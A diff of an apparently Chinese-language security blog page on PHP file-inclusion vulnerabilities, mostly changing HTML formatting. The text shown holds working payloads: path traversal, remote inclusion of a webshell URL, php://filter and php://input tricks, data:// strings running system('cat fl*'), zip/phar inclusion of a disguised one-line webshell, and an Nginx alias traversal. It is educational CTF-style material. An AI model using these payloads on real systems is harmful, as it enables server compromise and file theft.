@@ -33,17 +33,13 @@ requir"><meta name="keywords" content="Security, life"><meta content="width=devi
 <p>示例</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename = ../../../1.txt</span><br></pre></td></tr></table></figure>
 
-<br>
-
 <h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include = On/Off</span><br></pre></td></tr></table></figure>
 <p>示例</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename = http://192.168.59.1:8080/ws.php</span><br></pre></td></tr></table></figure>
-<br>
-
 <h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file://     --访问本地文件系统</span><br><span class="line">http://     --访问http(s)网址</span><br><span class="line">ftp://      --访问FTP(s) URLs</span><br><span class="line">php://      --访问各个输入/输出流</span><br><span class="line">zlib://     --压缩流</span><br><span class="line">data://     --数据</span><br><span class="line">phar://     --PHP归档</span><br></pre></td></tr></table></figure>
 
 <h3 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h3><h4 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><p><em>不受allow_url_fopen以及allow_url_include的影响</em></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php   # 得到base64编码格式的php文件。如果不加read读取链，则会将其中的内容当作PHP代码执行，则无法读取到其中的文件内容，所以要在read读取链中将其编码</span><br><span class="line">?file=php://filter/read=string.rot13/resource=flag.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php   </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">得到<span class="built_in">base64</span>编码格式的php文件。如果不加<span class="built_in">read</span>读取链，则会将其中的内容当作PHP代码执行，则无法读取到其中的文件内容，所以要在<span class="built_in">read</span>读取链中将其编码</span></span><br><span class="line">?file=php://filter/read=string.rot13/resource=flag.php</span><br></pre></td></tr></table></figure>
 
 <p>在看PHP:&#x2F;&#x2F;filter底层代码分析得时候，看到了一种形式</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/resource=a/convert.base64-decode/…/…/a.txt</span><br></pre></td></tr></table></figure>
@@ -52,30 +48,20 @@ requir"><meta name="keywords" content="Security, life"><meta content="width=devi
 <p>在此贴出出现了上面形式得博客链接</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/HBohan/article/details/121099051">php:&#x2F;&#x2F;filter 的浅略底层分析</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/121206836">[PHP底层]关于php:&#x2F;&#x2F;filter的分析</a></p>
-<br>
-
 <h4 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p><em>其只受allow_url_include参数的影响</em><br><em>当enctype&#x3D;”multipart&#x2F;form-data”时候，php:&#x2F;&#x2F;input无效</em></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test.php?file=php://input</span><br><span class="line"></span><br><span class="line">POST: &lt;?php info();?&gt;     # 将POST输入流当作PHP代码来执行</span><br></pre></td></tr></table></figure>
 
-<br>
-
 <h3 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test.php?file=file://C:/aa.txt</span><br><span class="line">test.php?file=file:///C://Users/Mini/Desktop/flag.txt       #常用于读取本地文件</span><br></pre></td></tr></table></figure>
-
-<br>
 
 <h3 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><p>和php:&#x2F;&#x2F;类似，都是用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中</p>
 <p><em>需要allow_url_include以及allow_url_fopen都开启</em></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php system(&quot;ping 127.0.0.1&quot;)?&gt;        # text/plain的意思是将文件设置为纯文本的形式，浏览器在获取到这种文件时并不会对其进行处理。text/plain后面的值会被当作php代码执行</span><br><span class="line">?file=data://text/plain,&lt;?=system(&#x27;cat fl*&#x27;);?&gt;</span><br><span class="line">?file=data://text/plain,&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">?file=data://text/plain,base64,PD9waHAgZWNobyBwaHBpbmZvKCk7Pz4=     #如果对特殊字符进行过滤，可以将代码进行base64编码后再输入</span><br></pre></td></tr></table></figure>
-
-<br>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php system(&quot;<span class="built_in">ping</span> <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&quot;)?&gt;        </span><br><span class="line"># text/plain的意思是将文件设置为纯文本的形式，浏览器在获取到这种文件时并不会对其进行处理。text/plain后面的值会被当作php代码执行</span><br><span class="line">?file=data://text/plain,&lt;?=system(&#x27;cat fl*&#x27;);?&gt;</span><br><span class="line">?file=data://text/plain,&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">?file=data://text/plain,base64,PD9waHAgZWNobyBwaHBpbmZvKCk7Pz4=     </span><br><span class="line">#如果对特殊字符进行过滤，可以将代码进行base64编码后再输入</span><br></pre></td></tr></table></figure>
 
 <h3 id="zip-x2F-x2F-与-phar-x2F-x2F-协议"><a href="#zip-x2F-x2F-与-phar-x2F-x2F-协议" class="headerlink" title="zip:&#x2F;&#x2F; 与 phar:&#x2F;&#x2F;协议"></a>zip:&#x2F;&#x2F; 与 phar:&#x2F;&#x2F;协议</h3><p><em>不受allow_url_fopen以及allow_url_include参数的影响</em></p>
 <p>倘若有一种情况限制文件后缀为php的文件，并且上传的文件只能是jpg格式</p>
 <p>比较旧的版本可以使用00截断、路径长度截断等。但是若没有截断漏洞时</p>
 <p>可以尝试使用zip伪协议，将木马放在压缩包中，再将压缩包后缀修改为上传白名单，然后使用zip协议进行包含</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?file=zip://C:\phpStudt\PHPTutorial\WWW\cc.jpg%23cc</span><br><span class="line"># zip://绝对路径\需要解压缩的文件%23子文件名</span><br><span class="line"></span><br><span class="line">?file=phar://cc.jpg/cc.php</span><br><span class="line"># 同zip协议，但是phar协议为相对路径，zip协议为绝对路径</span><br><span class="line"># phar://压缩包名/内部文件名，如写一个一句话木马cc.php，然后用zip协议压缩为cc.zip，再将后缀改为cc.jpg</span><br></pre></td></tr></table></figure>
-
-<br>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?file=zip://C:\phpStudt\PHPTutorial\WWW\cc.jpg%<span class="number">23</span>cc</span><br><span class="line"># zip://绝对路径\需要解压缩的文件%<span class="number">23</span>子文件名</span><br><span class="line"></span><br><span class="line">?file=phar://cc.jpg/cc.php</span><br><span class="line"># 同zip协议，但是phar协议为相对路径，zip协议为绝对路径</span><br><span class="line"># phar://压缩包名/内部文件名，如写一个一句话木马cc.php，然后用zip协议压缩为cc.zip，再将后缀改为cc.jpg</span><br></pre></td></tr></table></figure>
 
 <h3 id="http-x2F-x2F-访问http或https的网址"><a href="#http-x2F-x2F-访问http或https的网址" class="headerlink" title="http:&#x2F;&#x2F; 访问http或https的网址"></a>http:&#x2F;&#x2F; 访问http或https的网址</h3><p><em>allow_url_fopen与allow_url_include需要同时开启</em></p>
 <p>此伪协议就是远程文件包含漏洞。可通过其他主机getshell</p>
@@ -127,7 +113,7 @@ requir"><meta name="keywords" content="Security, life"><meta content="width=devi
 <li>Web日志重定向到了 &#x2F;dev&#x2F;stdout、&#x2F;dev&#x2F;stderr</li>
 </ul>
 <p>此时包含这些 Web 日志会出现 <code>include(/dev/pts/0): failed to open stream: Permission denied</code> 的错误，因为PHP没有权限包含设备文件</p>
-<p>所以，这种情况下利用日志包含来 getshell 的方法就无法进行</p>
+<p>所以，这种情况下<strong>无法</strong>利用日志包含来 getshell </p>
 <h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><h3 id="限制后缀"><a href="#限制后缀" class="headerlink" title="限制后缀"></a>限制后缀</h3><p>有一些开发者会限制文件的后缀，如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;] . &#x27;.php&#x27;;</span><br><span class="line">    echo $file;</span><br><span class="line">    include($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p>在下面条件时，可以使用%00截断</p>
@@ -174,13 +160,13 @@ requir"><meta name="keywords" content="Security, life"><meta content="width=devi
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%0a system(&#x27;cat /fl*&#x27;);</span><br></pre></td></tr></table></figure>
 
 <h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p>Nginx错误配置</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Location /static&#123;               # location /Purl 为普通匹配，Purl和用户请求url的开头相同就匹配成功。如请求是www.mysite.com/static/img/1.jpg</span><br><span class="line">    Alias /home/myapp/static/;  # alias指令是在其定义的目录下查找文件</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Location /static&#123;               </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">location /Purl 为普通匹配，Purl和用户请求url的开头相同就匹配成功。如请求是www.mysite.com/static/img/1.jpg</span></span><br><span class="line">    Alias /home/myapp/static/;  # alias指令是在其定义的目录下查找文件</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>如果配置文件包含上述内容，很可能是运维人员或开发人员想让用户访问static目录(一般是静态资源目录)</p>
 <p>如果用户请求的web路径是&#x2F;static…&#x2F;，拼接到alias上就变成了&#x2F;home&#x2F;myapp&#x2F;static&#x2F;…&#x2F;，此时便会产生目录穿越漏洞，并且穿越到myapp目录</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.139.128:8081/files../</span><br></pre></td></tr></table></figure>
 <p><a target="_blank" rel="noopener" href="http://t.zoukankan.com/yu2006070-01-p-10212646.html">Nginx配置文件中Location详解</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46407419/article/details/124855355">Linux Nginx的Location详解</a></p>
-<h3 id="session-文件包含"><a href="#session-文件包含" class="headerlink" title="session 文件包含"></a>session 文件包含</h3><p>在 php.ini 配置文件中的 <code>ession.upload_progress</code> 配置选项用于追踪文件上传的进度。当用户通过表单上传文件时，启用这个选项可以在服务器端记录上传的进度，它包括以下几个相关配置选项：</p>
+<h3 id="session-文件包含"><a href="#session-文件包含" class="headerlink" title="session 文件包含"></a>session 文件包含</h3><p>在 php.ini 配置文件中的 <code>session.upload_progress</code> 配置选项用于追踪文件上传的进度。当用户通过表单上传文件时，启用这个选项可以在服务器端记录上传的进度，它包括以下几个相关配置选项：</p>
 <ul>
 <li><code>session.upload_progress.enabled = on</code> : 启用或禁用上传进度跟踪。开启该功能后，当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中</li>
 <li><code>session.upload_progress.prefix = &quot;upload_progress_&quot;</code> : 上传进度信息 session 的键前缀</li>
